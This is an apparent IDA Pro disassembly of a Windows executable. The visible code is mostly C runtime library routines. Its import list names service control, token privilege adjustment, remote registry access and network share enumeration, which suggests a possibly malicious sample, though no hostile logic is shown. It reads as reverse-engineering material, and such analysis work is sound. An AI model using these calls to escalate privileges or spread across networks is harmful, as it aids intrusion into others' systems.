; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4

LeadDown2_0:
		mov	al, [esi+3]
		and	edx, ecx
		mov	[edi+3], al
		mov	al, [esi+2]
		shr	ecx, 2
		mov	[edi+2], al
		sub	esi, 2
		sub	edi, 2
		cmp	ecx, 8
		jb	short loc_407E10
		std
		rep movsd

loc_407E87:				; CODE XREF: .text:00407E45j
		cld
		jmp	ds:off_407F30[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 10h

LeadDown3_0:
		mov	al, [esi+3]
		and	edx, ecx
		mov	[edi+3], al
		mov	al, [esi+2]
		mov	[edi+2], al
		mov	al, [esi+1]
		shr	ecx, 2
		mov	[edi+1], al
		sub	esi, 3
		sub	edi, 3
		cmp	ecx, 8
		jb	loc_407E10
		std
		rep movsd
		cld
		jmp	ds:off_407F30[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4
		dd offset UnwindDown7_0
		dd offset UnwindDown6_0
		dd offset UnwindDown5_0
		dd offset UnwindDown4_0
		dd offset UnwindDown3_0
		dd offset UnwindDown2_0
		dd offset UnwindDown1_0
off_407EE0	dd offset UnwindDown0_0	; DATA XREF: .text:00407E12r
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

UnwindDown7_0:				; DATA XREF: .text:00407EC4o
		mov	eax, [esi+ecx*4+1Ch]
		mov	[edi+ecx*4+1Ch], eax

UnwindDown6_0:				; DATA XREF: .text:00407EC8o
		mov	eax, [esi+ecx*4+18h]
		mov	[edi+ecx*4+18h], eax

UnwindDown5_0:				; DATA XREF: .text:00407ECCo
		mov	eax, [esi+ecx*4+14h]
		mov	[edi+ecx*4+14h], eax

UnwindDown4_0:				; DATA XREF: .text:00407ED0o
		mov	eax, [esi+ecx*4+10h]
		mov	[edi+ecx*4+10h], eax

UnwindDown3_0:				; DATA XREF: .text:00407ED4o
		mov	eax, [esi+ecx*4+0Ch]
		mov	[edi+ecx*4+0Ch], eax

UnwindDown2_0:				; DATA XREF: .text:00407ED8o
		mov	eax, [esi+ecx*4+8]
		mov	[edi+ecx*4+8], eax

UnwindDown1_0:				; DATA XREF: .text:00407EDCo
		mov	eax, [esi+ecx*4+4]
		mov	[edi+ecx*4+4], eax
		lea	eax, ds:0[ecx*4]
		add	esi, eax
		add	edi, eax
; [0000005E BYTES: COLLAPSED FUNCTION UnwindDown0_0. PRESS KEYPAD "+" TO EXPAND]
; [0000002E BYTES: COLLAPSED FUNCTION _isalpha.	PRESS KEYPAD "+" TO EXPAND]
; [00000028 BYTES: COLLAPSED FUNCTION _isdigit.	PRESS KEYPAD "+" TO EXPAND]
; [00000028 BYTES: COLLAPSED FUNCTION _isspace.	PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000080 BYTES: COLLAPSED FUNCTION _strstr. PRESS KEYPAD "+"	TO EXPAND]
; [00000038 BYTES: COLLAPSED FUNCTION _strncmp.	PRESS KEYPAD "+" TO EXPAND]
; [000000EB BYTES: COLLAPSED FUNCTION start. PRESS KEYPAD "+" TO EXPAND]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		mov	esp, [ebp-18h]
		push	dword ptr [ebp-68h]
		call	__exit
; [00000025 BYTES: COLLAPSED FUNCTION __amsg_exit. PRESS KEYPAD	"+" TO EXPAND]
; [00000024 BYTES: COLLAPSED FUNCTION _fast_error_exit.	PRESS KEYPAD "+" TO EXPAND]
; [00000199 BYTES: COLLAPSED FUNCTION __setmbcp. PRESS KEYPAD "+" TO EXPAND]
; [0000004A BYTES: COLLAPSED FUNCTION _getSystemCP. PRESS KEYPAD "+" TO	EXPAND]
; [00000033 BYTES: COLLAPSED FUNCTION _CPtoLCID. PRESS KEYPAD "+" TO EXPAND]
; [00000029 BYTES: COLLAPSED FUNCTION _setSBCS.	PRESS KEYPAD "+" TO EXPAND]
; [00000185 BYTES: COLLAPSED FUNCTION _setSBUpLow. PRESS KEYPAD	"+" TO EXPAND]
; [0000001C BYTES: COLLAPSED FUNCTION ___initmbctable. PRESS KEYPAD "+"	TO EXPAND]
; [0000008A BYTES: COLLAPSED FUNCTION __mbsnbcpy. PRESS	KEYPAD "+" TO EXPAND]
; [00000224 BYTES: COLLAPSED FUNCTION ___crtLCMapStringA. PRESS	KEYPAD "+" TO EXPAND]
; [0000002B BYTES: COLLAPSED FUNCTION _strncnt.	PRESS KEYPAD "+" TO EXPAND]
; [00000075 BYTES: COLLAPSED FUNCTION __isctype. PRESS KEYPAD "+" TO EXPAND]
; [00000115 BYTES: COLLAPSED FUNCTION __flsbuf.	PRESS KEYPAD "+" TO EXPAND]
; [00000721 BYTES: COLLAPSED FUNCTION __output.	PRESS KEYPAD "+" TO EXPAND]
off_40916B	dd offset $NORMAL_STATE$1535 ; DATA XREF: __output+6Er
		dd offset loc_408ABF
		dd offset loc_408ADA
		dd offset loc_408B26
		dd offset loc_408B5D
		dd offset loc_408B65
		dd offset loc_408B9A
		dd offset loc_408C2D
; [00000035 BYTES: COLLAPSED FUNCTION _write_char. PRESS KEYPAD	"+" TO EXPAND]
; [00000031 BYTES: COLLAPSED FUNCTION _write_multi_char. PRESS KEYPAD "+" TO EXPAND]
; [00000038 BYTES: COLLAPSED FUNCTION _write_string. PRESS KEYPAD "+" TO EXPAND]
; [0000000D BYTES: COLLAPSED FUNCTION _get_int_arg. PRESS KEYPAD "+" TO	EXPAND]
; [00000010 BYTES: COLLAPSED FUNCTION _get_int64_arg. PRESS KEYPAD "+" TO EXPAND]
; [0000000E BYTES: COLLAPSED FUNCTION _get_short_arg. PRESS KEYPAD "+" TO EXPAND]
; [0000002F BYTES: COLLAPSED FUNCTION _free. PRESS KEYPAD "+" TO EXPAND]
; [00000012 BYTES: COLLAPSED FUNCTION _malloc. PRESS KEYPAD "+"	TO EXPAND]
; [0000002C BYTES: COLLAPSED FUNCTION __nh_malloc. PRESS KEYPAD	"+" TO EXPAND]
; [00000036 BYTES: COLLAPSED FUNCTION __heap_alloc. PRESS KEYPAD "+" TO	EXPAND]
; [00000A25 BYTES: COLLAPSED FUNCTION __input. PRESS KEYPAD "+"	TO EXPAND]
; [00000037 BYTES: COLLAPSED FUNCTION __hextodec. PRESS	KEYPAD "+" TO EXPAND]
; [0000001A BYTES: COLLAPSED FUNCTION _fgetc. PRESS KEYPAD "+" TO EXPAND]
; [00000017 BYTES: COLLAPSED FUNCTION __un_inc.	PRESS KEYPAD "+" TO EXPAND]
; [00000024 BYTES: COLLAPSED FUNCTION __whiteout. PRESS	KEYPAD "+" TO EXPAND]
		align 10h
; START	OF FUNCTION CHUNK FOR _strstr

loc_409DB0:				; CODE XREF: _strstr+1DCDj
		lea	eax, [edx-1]
		pop	ebx
		retn
; END OF FUNCTION CHUNK	FOR _strstr
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION _strchr. PRESS KEYPAD "+"	TO EXPAND]
; START	OF FUNCTION CHUNK FOR _strstr

___from_strstr_to_strchr:		; CODE XREF: _strstr+6Ej
		push	ebx
		mov	ebx, eax
		shl	eax, 8
		mov	edx, [esp+4+arg_0]
		test	edx, 3
		jz	short loc_409DEB

loc_409DD8:				; CODE XREF: _strstr+1DD9j
		mov	cl, [edx]
		inc	edx
		cmp	cl, bl
		jz	short loc_409DB0
		test	cl, cl
		jz	short loc_409E34
		test	edx, 3
		jnz	short loc_409DD8

loc_409DEB:				; CODE XREF: _strstr+1DC6j
		or	ebx, eax
		push	edi
		mov	eax, ebx
		shl	ebx, 10h
		push	esi
		or	ebx, eax

loc_409DF6:				; CODE XREF: _strstr+1E11j
					; _strstr+1E20j ...
		mov	ecx, [edx]
		mov	edi, 7EFEFEFFh
		mov	eax, ecx
		mov	esi, edi
		xor	ecx, ebx
		add	esi, eax
		add	edi, ecx
		xor	ecx, 0FFFFFFFFh
		xor	eax, 0FFFFFFFFh
		xor	ecx, edi
		xor	eax, esi
		add	edx, 4
		and	ecx, 81010100h
		jnz	short loc_409E38
		and	eax, 81010100h
		jz	short loc_409DF6
		and	eax, 1010100h
		jnz	short loc_409E32
		and	esi, 80000000h
		jnz	short loc_409DF6

loc_409E32:				; CODE XREF: _strstr+1E18j
					; _strstr+1E31j ...
		pop	esi
		pop	edi

loc_409E34:				; CODE XREF: _strstr+1DD1j
		pop	ebx
		xor	eax, eax
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_409E38:				; CODE XREF: _strstr+1E0Aj
		mov	eax, [edx-4]
		cmp	al, bl
		jz	short loc_409E75
		test	al, al
		jz	short loc_409E32
		cmp	ah, bl
		jz	short loc_409E6E
		test	ah, ah
		jz	short loc_409E32
		shr	eax, 10h
		cmp	al, bl
		jz	short loc_409E67
		test	al, al
		jz	short loc_409E32
		cmp	ah, bl
		jz	short loc_409E60
		test	ah, ah
		jz	short loc_409E32
		jmp	short loc_409DF6
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_409E60:				; CODE XREF: _strstr+1E48j
		pop	esi
		pop	edi
		lea	eax, [edx-1]
		pop	ebx
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_409E67:				; CODE XREF: _strstr+1E40j
		lea	eax, [edx-2]
		pop	esi
		pop	edi
		pop	ebx
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_409E6E:				; CODE XREF: _strstr+1E35j
		lea	eax, [edx-3]
		pop	esi
		pop	edi
		pop	ebx
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_409E75:				; CODE XREF: _strstr+1E2Dj
		lea	eax, [edx-4]
		pop	esi
		pop	edi
		pop	ebx
		retn
; END OF FUNCTION CHUNK	FOR _strstr
; [0000002D BYTES: COLLAPSED FUNCTION __cinit. PRESS KEYPAD "+"	TO EXPAND]
; [00000011 BYTES: COLLAPSED FUNCTION _exit. PRESS KEYPAD "+" TO EXPAND]
; [00000011 BYTES: COLLAPSED FUNCTION __exit. PRESS KEYPAD "+" TO EXPAND]
; [00000099 BYTES: COLLAPSED FUNCTION _doexit. PRESS KEYPAD "+"	TO EXPAND]
; [0000001A BYTES: COLLAPSED FUNCTION __initterm. PRESS	KEYPAD "+" TO EXPAND]
; [00000141 BYTES: COLLAPSED FUNCTION __XcptFilter. PRESS KEYPAD "+" TO	EXPAND]
; [00000043 BYTES: COLLAPSED FUNCTION _xcptlookup. PRESS KEYPAD	"+" TO EXPAND]
; [00000058 BYTES: COLLAPSED FUNCTION __wincmdln. PRESS	KEYPAD "+" TO EXPAND]
; [000000B9 BYTES: COLLAPSED FUNCTION __setenvp. PRESS KEYPAD "+" TO EXPAND]
; [00000099 BYTES: COLLAPSED FUNCTION __setargv. PRESS KEYPAD "+" TO EXPAND]
; [000001B4 BYTES: COLLAPSED FUNCTION _parse_cmdline. PRESS KEYPAD "+" TO EXPAND]
; [00000132 BYTES: COLLAPSED FUNCTION ___crtGetEnvironmentStringsA. PRESS KEYPAD "+" TO	EXPAND]
; [000001AB BYTES: COLLAPSED FUNCTION __ioinit.	PRESS KEYPAD "+" TO EXPAND]
; [0000003C BYTES: COLLAPSED FUNCTION __heap_init. PRESS KEYPAD	"+" TO EXPAND]
		align 4
; [00000020 BYTES: COLLAPSED FUNCTION __global_unwind2.	PRESS KEYPAD "+" TO EXPAND]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

__unwind_handler:			; DATA XREF: __local_unwind2+Ao
					; __abnormal_termination+9o
		mov	ecx, [esp+4]
		test	dword ptr [ecx+4], 6
		mov	eax, 1
		jz	short locret_40A7BD
		mov	eax, [esp+8]
		mov	edx, [esp+10h]
		mov	[edx], eax
		mov	eax, 3

locret_40A7BD:				; CODE XREF: .text:0040A7ACj
		retn
; [00000068 BYTES: COLLAPSED FUNCTION __local_unwind2. PRESS KEYPAD "+"	TO EXPAND]
; [00000023 BYTES: COLLAPSED FUNCTION __abnormal_termination. PRESS KEYPAD "+" TO EXPAND]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

__NLG_Notify1:
		push	ebx
		push	ecx
		mov	ebx, offset unk_4114E4
		jmp	short loc_40A85C
; [00000018 BYTES: COLLAPSED FUNCTION __NLG_Notify. PRESS KEYPAD "+" TO	EXPAND]
		align 4
		push	esi
		inc	ebx
		xor	dh, [eax]
		pop	eax
		inc	ebx
		xor	[eax], dh
; [000000BD BYTES: COLLAPSED FUNCTION unknown_libname_1. PRESS KEYPAD "+" TO EXPAND]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

unknown_libname_8:			; Microsoft VisualC 2-7/net runtime
		push	ebp
		mov	ecx, [esp+8]
		mov	ebp, [ecx]
		mov	eax, [ecx+1Ch]
		push	eax
		mov	eax, [ecx+18h]
		push	eax
		call	__local_unwind2
		add	esp, 8
		pop	ebp
		retn	4
; [00000039 BYTES: COLLAPSED FUNCTION __FF_MSGBANNER. PRESS KEYPAD "+" TO EXPAND]
; [00000153 BYTES: COLLAPSED FUNCTION __NMSG_WRITE. PRESS KEYPAD "+" TO	EXPAND]
; [00000149 BYTES: COLLAPSED FUNCTION ___crtGetStringTypeA. PRESS KEYPAD "+" TO	EXPAND]
		align 10h
; [000000FE BYTES: COLLAPSED FUNCTION _strncpy.	PRESS KEYPAD "+" TO EXPAND]
; [0000009A BYTES: COLLAPSED FUNCTION __lseek. PRESS KEYPAD "+"	TO EXPAND]
; [000001AD BYTES: COLLAPSED FUNCTION __write. PRESS KEYPAD "+"	TO EXPAND]
; [00000044 BYTES: COLLAPSED FUNCTION __getbuf.	PRESS KEYPAD "+" TO EXPAND]
; [00000026 BYTES: COLLAPSED FUNCTION __isatty.	PRESS KEYPAD "+" TO EXPAND]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

___initstdio:
		mov	eax, dword_493100
		push	esi
		push	14h
		test	eax, eax
		pop	esi
		jnz	short loc_40AFF3
		mov	eax, 200h
		jmp	short loc_40AFF9
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40AFF3:				; CODE XREF: .text:0040AFEAj
		cmp	eax, esi
		jge	short loc_40AFFE
		mov	eax, esi

loc_40AFF9:				; CODE XREF: .text:0040AFF1j
		mov	dword_493100, eax

loc_40AFFE:				; CODE XREF: .text:0040AFF5j
		push	4
		push	eax
		call	_calloc
		pop	ecx
		mov	dword_4920EC, eax
		test	eax, eax
		pop	ecx
		jnz	short loc_40B032
		push	4
		push	esi
		mov	dword_493100, esi
		call	_calloc
		pop	ecx
		mov	dword_4920EC, eax
		test	eax, eax
		pop	ecx
		jnz	short loc_40B032
		push	1Ah
		call	__amsg_exit
		pop	ecx

loc_40B032:				; CODE XREF: .text:0040B00Fj
					; .text:0040B028j
		xor	ecx, ecx
		mov	eax, offset off_411590

loc_40B039:				; CODE XREF: .text:0040B04Dj
		mov	edx, dword_4920EC
		mov	[ecx+edx], eax
		add	eax, 20h
		add	ecx, 4
		cmp	eax, offset off_411810
		jl	short loc_40B039
		xor	edx, edx
		mov	ecx, offset unk_4115A0

loc_40B056:				; CODE XREF: .text:0040B080j
		mov	eax, edx
		mov	esi, edx
		sar	eax, 5
		and	esi, 1Fh
		mov	eax, dword_493120[eax*4]
		mov	eax, [eax+esi*8]
		cmp	eax, 0FFFFFFFFh
		jz	short loc_40B073
		test	eax, eax
		jnz	short loc_40B076

loc_40B073:				; CODE XREF: .text:0040B06Dj
		or	dword ptr [ecx], 0FFFFFFFFh

loc_40B076:				; CODE XREF: .text:0040B071j
		add	ecx, 20h
		inc	edx
		cmp	ecx, offset unk_411600
		jl	short loc_40B056
		pop	esi
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

___endstdio:
		call	sub_40C01B
		cmp	byte_491F9C, 0
		jz	short locret_40B097
		jmp	__fcloseall
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

locret_40B097:				; CODE XREF: .text:0040B090j
		retn
; [00000068 BYTES: COLLAPSED FUNCTION _wctomb. PRESS KEYPAD "+"	TO EXPAND]
; [00000068 BYTES: COLLAPSED FUNCTION __aulldiv. PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000075 BYTES: COLLAPSED FUNCTION __aullrem. PRESS KEYPAD "+" TO EXPAND]
; [0000003E BYTES: COLLAPSED FUNCTION ___sbh_heap_init.	PRESS KEYPAD "+" TO EXPAND]
; [0000002B BYTES: COLLAPSED FUNCTION ___sbh_find_block. PRESS KEYPAD "+" TO EXPAND]
; [0000032B BYTES: COLLAPSED FUNCTION ___sbh_free_block. PRESS KEYPAD "+" TO EXPAND]
; [00000309 BYTES: COLLAPSED FUNCTION ___sbh_alloc_block. PRESS	KEYPAD "+" TO EXPAND]
; [000000B1 BYTES: COLLAPSED FUNCTION ___sbh_alloc_new_region. PRESS KEYPAD "+"	TO EXPAND]
; [000000FB BYTES: COLLAPSED FUNCTION ___sbh_alloc_new_group. PRESS KEYPAD "+" TO EXPAND]
; [0000001B BYTES: COLLAPSED FUNCTION __callnewh. PRESS	KEYPAD "+" TO EXPAND]
; [000000C8 BYTES: COLLAPSED FUNCTION _mbtowc. PRESS KEYPAD "+"	TO EXPAND]
		align 10h
; [00000034 BYTES: COLLAPSED FUNCTION __allmul.	PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [0000001F BYTES: COLLAPSED FUNCTION __allshl.	PRESS KEYPAD "+" TO EXPAND]
; [000000D9 BYTES: COLLAPSED FUNCTION __filbuf.	PRESS KEYPAD "+" TO EXPAND]
; [0000006E BYTES: COLLAPSED FUNCTION _ungetc. PRESS KEYPAD "+"	TO EXPAND]
; [00000011 BYTES: COLLAPSED FUNCTION __ismbblead. PRESS KEYPAD	"+" TO EXPAND]
; [00000031 BYTES: COLLAPSED FUNCTION _x_ismbbtype. PRESS KEYPAD "+" TO	EXPAND]
; [00000089 BYTES: COLLAPSED FUNCTION ___crtMessageBoxA. PRESS KEYPAD "+" TO EXPAND]
; [00000067 BYTES: COLLAPSED FUNCTION __dosmaperr. PRESS KEYPAD	"+" TO EXPAND]
; [0000007A BYTES: COLLAPSED FUNCTION __free_osfhnd. PRESS KEYPAD "+" TO EXPAND]
; [0000003D BYTES: COLLAPSED FUNCTION __get_osfhandle. PRESS KEYPAD "+"	TO EXPAND]
; [0000007D BYTES: COLLAPSED FUNCTION _calloc. PRESS KEYPAD "+"	TO EXPAND]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

__fcloseall:				; CODE XREF: .text:0040B092j
		push	esi
		push	edi
		push	3
		xor	edi, edi
		pop	esi
		cmp	dword_493100, esi
		jle	short loc_40BF7F

loc_40BF3B:				; CODE XREF: .text:0040BF7Dj
		mov	eax, dword_4920EC
		mov	eax, [eax+esi*4]
		test	eax, eax
		jz	short loc_40BF76
		test	byte ptr [eax+0Ch], 83h
		jz	short loc_40BF5A
		push	eax
		call	_fclose
		cmp	eax, 0FFFFFFFFh
		pop	ecx
		jz	short loc_40BF5A
		inc	edi

loc_40BF5A:				; CODE XREF: .text:0040BF4Bj
					; .text:0040BF57j
		cmp	esi, 14h
		jl	short loc_40BF76
		mov	eax, dword_4920EC
		push	dword ptr [eax+esi*4]
		call	_free
		mov	eax, dword_4920EC
		pop	ecx
		and	dword ptr [eax+esi*4], 0

loc_40BF76:				; CODE XREF: .text:0040BF45j
					; .text:0040BF5Dj
		inc	esi
		cmp	esi, dword_493100
		jl	short loc_40BF3B

loc_40BF7F:				; CODE XREF: .text:0040BF39j
		mov	eax, edi
		pop	edi
		pop	esi
		retn
; [0000003B BYTES: COLLAPSED FUNCTION _fflush. PRESS KEYPAD "+"	TO EXPAND]
; [0000005C BYTES: COLLAPSED FUNCTION __flush. PRESS KEYPAD "+"	TO EXPAND]

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_40C01B	proc near		; CODE XREF: .text:___endstdiop
		push	1
		call	_flsall
		pop	ecx
		retn
sub_40C01B	endp

; [0000006D BYTES: COLLAPSED FUNCTION _flsall. PRESS KEYPAD "+"	TO EXPAND]
; [00000009 BYTES: COLLAPSED FUNCTION __fptrap.	PRESS KEYPAD "+" TO EXPAND]
; [000001F6 BYTES: COLLAPSED FUNCTION __read. PRESS KEYPAD "+" TO EXPAND]
; [00000056 BYTES: COLLAPSED FUNCTION _fclose. PRESS KEYPAD "+"	TO EXPAND]
; [00000057 BYTES: COLLAPSED FUNCTION __commit.	PRESS KEYPAD "+" TO EXPAND]
; [000000B3 BYTES: COLLAPSED FUNCTION __close. PRESS KEYPAD "+"	TO EXPAND]
; [0000002B BYTES: COLLAPSED FUNCTION __freebuf. PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION WNetCloseEnum. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION WNetEnumResourceA. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION WNetOpenEnumA. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION RtlUnwind. PRESS KEYPAD "+" TO EXPAND]
; [0000009E BYTES: COLLAPSED FUNCTION __strupr.	PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [000000AD BYTES: COLLAPSED FUNCTION __strnicmp. PRESS	KEYPAD "+" TO EXPAND]
		align 10h
; [0000008C BYTES: COLLAPSED FUNCTION unknown_libname_9. PRESS KEYPAD "+" TO EXPAND]
; [0000009E BYTES: COLLAPSED FUNCTION __strlwr.	PRESS KEYPAD "+" TO EXPAND]
		align 1000h
_text		ends

; Section 2. (virtual address 0000D000)
; Virtual size			: 00000FEA (   4074.)
; Section size in file		: 00001000 (   4096.)
; Offset to raw	data for section: 0000D000
; Flags	40000040: Data Readable
; Alignment	: 16 bytes ?
;
; Imports from ADVAPI32
;
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Externs
; _idata
; BOOL __stdcall StartServiceCtrlDispatcherA(const SERVICE_TABLE_ENTRYA	*lpServiceStartTable)
		extrn StartServiceCtrlDispatcherA:dword	; DATA XREF: WinMain(x,x,x,x)+61r
; BOOL __stdcall LookupPrivilegeValueA(LPCSTR lpSystemName,LPCSTR lpName,PLUID lpLuid)
		extrn LookupPrivilegeValueA:dword ; DATA XREF: sub_40530F+42r
; BOOL __stdcall AdjustTokenPrivileges(HANDLE TokenHandle,BOOL DisableAllPrivileges,PTOKEN_PRIVILEGES NewState,DWORD BufferLength,PTOKEN_PRIVILEGES PreviousState,PDWORD ReturnLength)
		extrn AdjustTokenPrivileges:dword ; DATA XREF: sub_40530F+4Fr
					; sub_40530F+79r ...
					; Enable/disable privileges in the specified access token
; LONG __stdcall RegCreateKeyA(HKEY hKey,LPCSTR	lpSubKey,PHKEY phkResult)
		extrn RegCreateKeyA:dword ; DATA XREF: sub_404540+Dr
; LONG __stdcall RegSetValueExA(HKEY hKey,LPCSTR lpValueName,DWORD Reserved,DWORD dwType,const BYTE *lpData,DWORD cbData)
		extrn RegSetValueExA:dword ; DATA XREF:	sub_404540+33r
; LONG __stdcall RegQueryValueExA(HKEY hKey,LPCSTR lpValueName,LPDWORD lpReserved,LPDWORD lpType,LPBYTE	lpData,LPDWORD lpcbData)
		extrn RegQueryValueExA:dword ; DATA XREF: sub_4044E4+49r
; BOOL __stdcall StartServiceA(SC_HANDLE hService,DWORD	dwNumServiceArgs,LPCSTR	*lpServiceArgVectors)
		extrn StartServiceA:dword ; DATA XREF: sub_40280F+25Br
					; sub_40686A+16Ar
; LONG __stdcall RegConnectRegistryA(LPCSTR lpMachineName,HKEY hKey,PHKEY phkResult)
		extrn RegConnectRegistryA:dword	; DATA XREF: sub_40280F+34Br
					; Establish a connection to a predefined
					; registry handle on another computer
; BOOL __stdcall OpenProcessToken(HANDLE ProcessHandle,DWORD DesiredAccess,PHANDLE TokenHandle)
		extrn OpenProcessToken:dword ; DATA XREF: sub_402642+59r
					; sub_40530F+2Ar
					; Open the access token	associated with	a process
; BOOL __stdcall GetTokenInformation(HANDLE TokenHandle,TOKEN_INFORMATION_CLASS	TokenInformationClass,LPVOID TokenInformation,DWORD TokenInformationLength,PDWORD ReturnLength)
		extrn GetTokenInformation:dword	; DATA XREF: sub_402642+8Fr
					; sub_402642+CDr
					; Get specified	type of	information
					; about	an access token
; BOOL __stdcall AllocateAndInitializeSid(PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority,BYTE nSubAuthorityCount,DWORD nSubAuthority0,DWORD nSubAuthority1,DWORD nSubAuthority2,DWORD nSubAuthority3,DWORD nSubAuthority4,DWORD	nSubAuthority5,DWORD nSubAuthority6,DWORD nSubAuthority7,PSID *pSid)
